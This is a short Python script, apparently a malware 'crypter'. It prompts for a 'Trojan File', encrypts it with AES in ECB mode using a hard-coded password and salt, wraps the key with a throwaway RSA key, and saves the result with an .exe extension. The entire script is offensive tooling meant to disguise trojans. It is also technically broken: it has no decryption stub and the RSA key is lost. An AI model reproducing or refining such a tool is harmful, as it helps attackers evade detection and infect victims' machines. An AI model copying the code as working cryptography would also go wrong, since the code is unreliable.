import base64
import os
import tkinter as tk
from tkinter import filedialog
from cryptography.hazmat.primitives.ciphers import Cipher, algorithms, modes
from cryptography.hazmat.backends import default_backend
from cryptography.hazmat.primitives import padding
from cryptography.hazmat.primitives.asymmetric import rsa, padding as rsa_padding
from cryptography.hazmat.primitives import hashes
from cryptography.hazmat.primitives.kdf.pbkdf2 import PBKDF2HMAC

root = tk.Tk()
root.withdraw()

trojan_path = filedialog.askopenfilename(title="Select Trojan File")
encrypted_trojan_path = filedialog.asksaveasfilename(title="Save Encrypted Trojan As", defaultextension='.exe')

with open(trojan_path, 'rb') as file:
    trojan_data = file.read()

def encrypt_aes(data, key):
    padder = padding.PKCS7(128).padder()
    padded_data = padder.update(data) + padder.finalize()

    cipher = Cipher(algorithms.AES(key), modes.ECB(), backend=default_backend())
    encryptor = cipher.encryptor()
    encrypted_data = encryptor.update(padded_data) + encryptor.finalize()

    return encrypted_data

def encrypt_rsa(data, public_key):
    encrypted_data = public_key.encrypt(
        data,
        rsa_padding.OAEP(
            mgf=rsa_padding.MGF1(algorithm=hashes.SHA256()),
            algorithm=hashes.SHA256(),
            label=None
        )
    )
    return encrypted_data

salt = b'cGc0zoasYzPYEd7mf18Z9hy7VDfAkpauLRrOxMtrbrskDd4eyoktbegKhmlpc4KHdmEMda0zdevovDCx2HoXMPu9NOvbeAd08ZOy'
password = b'darktaple'
kdf = PBKDF2HMAC(
    algorithm=hashes.SHA256(),
    length=32,
    salt=salt,
    iterations=100000,
    backend=default_backend()
)
aes_key = kdf.derive(password)

rsa_key = rsa.generate_private_key(
    public_exponent=65537,
    key_size=2048,
    backend=default_backend()
)
public_key = rsa_key.public_key()

encrypted_data_aes = encrypt_aes(trojan_data, aes_key)

encrypted_aes_key = encrypt_rsa(aes_key, public_key)

encrypted_data_base64 = base64.b64encode(encrypted_data_aes).decode('utf-8')
encrypted_key_base64 = base64.b64encode(encrypted_aes_key).decode('utf-8')

directory_path = filedialog.askdirectory(title="Select Directory to Save Encrypted Trojan")
encrypted_trojan_path = os.path.join(directory_path, os.path.basename(encrypted_trojan_path))

with open(encrypted_trojan_path, 'wb') as file:
    file.write(encrypted_data_aes)

os.startfile(directory_path)
